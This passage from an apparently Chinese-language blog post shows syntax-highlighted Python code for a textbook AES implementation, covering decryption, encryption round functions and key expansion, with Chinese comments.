[]</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            temp.append(key[j])</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">        n = i</div><div class="line">        key = 密钥扩展.KeySchedule(key,n)</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            temp.append(key[j])</div><div class="line">    out1 = AddRoundKey(test,key[<span class="number">-4</span>:])       <span class="comment">#第一次轮密钥加</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):                      <span class="comment">#循环九轮（逆行移位--&gt;逆字节替代--&gt;轮密钥加--&gt;逆列混合）</span></div><div class="line">        out2 = InvSubBytes(InvShiftRows(out1))</div><div class="line"></div><div class="line">        k = temp[(<span class="number">-4</span>)*(i+<span class="number">2</span>):(<span class="number">-4</span>)*(i+<span class="number">2</span>)+<span class="number">4</span>]    <span class="comment">#i从0开始,i=0时，(-4)*(i+2)=-8</span></div><div class="line">        out1 = InvMixColumns(AddRoundKey(out2,k))</div><div class="line">    out = InvSubBytes(InvShiftRows(out1))   <span class="comment">#第十轮（逆行移位--&gt;逆字节替代）</span></div><div class="line"></div><div class="line">    out1 = AddRoundKey(out,temp[<span class="number">0</span>:<span class="number">4</span>])       <span class="comment">#最后一次轮密钥加</span></div><div class="line">    print(<span class="string">"明文为："</span>+PrintOut(out1))</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#从文档读取明文</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ReadFile</span><span class="params">()</span>:</span></div><div class="line">    file = open(<span class="string">'test.txt'</span>,<span class="string">'r'</span>)</div><div class="line">    temp = []</div><div class="line">    a = file.readlines()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</div><div class="line">        b = i.split( )</div><div class="line">        <span class="keyword">if</span> b:</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> b:</div><div class="line">                temp.append(j[<span class="number">4</span>:])</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span>(<span class="string">"文件为空！"</span>)</div><div class="line"></div><div class="line">    input1 = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(temp)/<span class="number">2</span>)):   <span class="comment">#len(a)/2为浮点数</span></div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line"></div><div class="line">            b = <span class="string">'0x'</span>+temp[i*<span class="number">2</span>+<span class="number">1</span>][j*<span class="number">2</span>:j*<span class="number">2</span>+<span class="number">2</span>]</div><div class="line">            input1.append(int(b,<span class="number">16</span>))</div><div class="line">        input2 = [[<span class="string">'*'</span><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">        x = <span class="number">0</span></div><div class="line"></div><div class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>):                      <span class="comment">#一维数组转二维数组</span></div><div class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">                input2[m][n] = input1[x]</div><div class="line">                x = x+<span class="number">1</span></div><div class="line"></div><div class="line">        input1 = []</div><div class="line">        print(<span class="string">"密文为："</span>+PrintOut(input2))</div><div class="line">        decode(input2)</div><div class="line">        print(<span class="string">'--------------------------------------------------------------------------------------'</span>)</div><div class="line">    <span class="keyword">return</span>(<span class="string">"读取完毕！"</span>)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Trans</span><span class="params">(Input)</span>:</span></div><div class="line">    temp = Input</div><div class="line">    input1 = []</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):   <span class="comment">#len(a)/2为浮点数</span></div><div class="line">        b = <span class="string">'0x'</span>+temp[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>]</div><div class="line">        input1.append(int(b,<span class="number">16</span>))</div><div class="line">    input2 = [[<span class="string">'*'</span><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    x = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">4</span>):                      <span class="comment">#一维数组转二维数组</span></div><div class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            input2[m][n] = input1[x]</div><div class="line">            x = x+<span class="number">1</span></div><div class="line">    <span class="keyword">return</span>(input2)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line"><span class="string">一维数组--&gt;二维数组</span></div><div class="line"><span class="string">for n in range(4):                      #一维数组转二维数组</span></div><div class="line"><span class="string">        input2.append(input1[n*4:n*4+4])</span></div><div class="line"><span class="string">'''</span></div></pre></td></tr></table></figure><h3 id="3-2-encode-py"><a href="#3-2-encode-py" class="headerlink" title="3.2 encode.py:"></a>3.2 encode.py:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> 密钥扩展</div><div class="line"></div><div class="line"><span class="comment">#字节替代</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubBytes</span><span class="params">(inputt)</span>:</span></div><div class="line">    out_ = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    map_ = [<span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</div><div class="line">        <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</div><div class="line">        <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</div><div class="line">        <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</div><div class="line">        <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</div><div class="line">        <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</div><div class="line">        <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</div><div class="line">        <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</div><div class="line">        <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</div><div class="line">        <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</div><div class="line">        <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</div><div class="line">        <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</div><div class="line">        <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</div><div class="line">        <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</div><div class="line">        <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</div><div class="line">        <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            out_[i][j] =map_[inputt[i][j]]</div><div class="line">    <span class="keyword">return</span> out_</div><div class="line"></div><div class="line"><span class="comment">#行移位</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShiftRows</span><span class="params">(inputt)</span>:</span></div><div class="line"></div><div class="line">    out = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]  <span class="comment"># 创建一个空的二维数组用：</span></div><div class="line">                                                     <span class="comment"># temp=[['*'for i in range(n)]for i in range(m)]</span></div><div class="line">                                                     <span class="comment"># ！不使用：</span></div><div class="line">                                                     <span class="comment"># temp=[['*']*n]*m</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            out[i][j-i] = inputt[i][j]</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"><span class="comment">#列混合</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">MixColumns</span><span class="params">(inputt)</span>:</span></div><div class="line">    col = [[<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0x01</span>],[<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x01</span>],[<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>],[<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x02</span>]]</div><div class="line">    out = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            out[i][j]=Mult(inputt[<span class="number">0</span>][j],col[i][<span class="number">0</span>])^Mult(inputt[<span class="number">1</span>][j],col[i][<span class="number">1</span>])^Mult(inputt[<span class="number">2</span>][j],col[i][<span class="number">2</span>])^Mult(inputt[<span class="number">3</span>][j],col[i][<span class="number">3</span>])</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#点乘</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mult</span><span class="params">(a,b)</span>:</span></div><div class="line">    temp = [<span class="string">''</span>]*<span class="number">8</span></div><div class="line">    temp[<span class="number">0</span>]=int(a)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</div><div class="line">        <span class="keyword">if</span> temp[i]&lt;<span class="number">128</span>:</div><div class="line">            temp[i+<span class="number">1</span>] = temp[i]&lt;&lt;<span class="number">1</span>  <span class="comment">#若小于0b10000000则直接右移</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            temp[i+<span class="number">1</span>] = ((temp[i]&lt;&lt;<span class="number">1</span>)<span class="number">-0x100</span>)^<span class="number">0x1B</span></div><div class="line">    mult = <span class="number">0x00</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        mult ^= (b&gt;&gt;i&amp;<span class="number">1</span>)*temp[i]</div><div class="line">    <span class="keyword">return</span> mult</div><div class="line"></div><div class="line"><span class="comment">#轮密钥加</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddRoundKey</span><span class="params">(input_,key)</span>:</span></div><div class="line"></div><div class="line">    temp = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            temp[i][j] = key[i][j]^input_[i][j]</div><div class="line">    <span class="keyword">return</span> temp</div><div class="line"></div><div class="line"><span class="comment">#规范输出格式</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrentOut</span><span class="params">(input_)</span>:</span></div><div class="line">    temp = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            temp[i][j] = hex(input_[i][j])</div><div class="line">    <span class="keyword">return</span> temp</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#加密过程</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(test)</span>:</span></div><div class="line">    input1 = test</div><div class="line">    key = [[<span class="number">0x2b</span>,<span class="number">0x28</span>,<span class="number">0xab</span>,<span class="number">0x09</span>],[<span class="number">0x7e</span>,<span class="number">0xae</span>,<span class="number">0xf7</span>,<span class="number">0xcf</span>],[<span class="number">0x15</span>,<span class="number">0xd2</span>,<span class="number">0x15</span>,<span class="number">0x4f</span>],[<span class="number">0x16</span>,<span class="number">0xa6</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>]]</div><div class="line">    out1 = AddRoundKey(input1,key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</div><div class="line">        n = i</div><div class="line">        out2 = MixColumns(ShiftRows(SubBytes(out1)))</div><div class="line">        key = 密钥扩展.KeySchedule(key,n)</div><div class="line">        out1 = AddRoundKey(out2,key)</div><div class="line">    out2 = ShiftRows(SubBytes(out1))</div><div class="line">    key = 密钥扩展.KeySchedule(key,<span class="number">9</span>)</div><div class="line">    out1 = AddRoundKey(out2,key)</div><div class="line">    print(<span class="string">'--------------------------------------------------------------------------------------'</span>)</div><div class="line">    <span class="keyword">return</span> out1</div></pre></td></tr></table></figure><h3 id="3-3-密钥扩展-py"><a href="#3-3-密钥扩展-py" class="headerlink" title="3.3 密钥扩展.py:"></a>3.3 密钥扩展.py:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line"><span class="comment">#主函数</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">KeySchedule</span><span class="params">(input1,num)</span>:</span></div><div class="line">    Input = input1</div><div class="line">    n = num</div><div class="line">    k3 = [<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            k3[i] = Input[i][<span class="number">3</span>]</div><div class="line">    out = Output(Input,k3,n)</div><div class="line">    <span class="keyword">return</span>  out</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#输出</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Output</span><span class="params">(Input,k3,num)</span>:</span></div><div class="line">    n = num</div><div class="line">    Tk3 = Rcons45(SubBytes45(ShiftRows45(k3)),n)</div><div class="line">    out = Mod45(Input,Tk3)</div><div class="line"></div><div class="line">    <span class="comment">#将输出结果转为十六进制</span></div><div class="line">    trans = [[<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">            trans[i][j] = hex(out[i][j])</div><div class="line"></div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#左循环1字节</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShiftRows45</span><span class="params">(k3)</span>:</span></div><div class="line">    out = [<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">        <span class="keyword">if</span>(j==<span class="number">3</span>):</div><div class="line">            out[<span class="number">3</span>] = k3[<span class="number">0</span>]</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            out[j] = k3[j+<span class="number">1</span>]</div><div class="line">    <span class="keyword">return</span> out</div><div class="line"></div><div class="line"><span class="comment">#s盒替换</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubBytes45</span><span class="params">(k3)</span>:</span></div><div class="line">    out = [<span class="string">'*'</span><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>)]</div><div class="line">    Map = [<span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</div><div class="line">        <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</div><div class="line">        <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</div><div class="line">        <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</div><div class="line">        <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</div><div class="line">        <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</div><div class="line">        <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</div><div class="line">        <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</div><div class="line">        <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</div><div class="line">        <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</div><div class="line">        <span class="number">0xe0</span>,<span 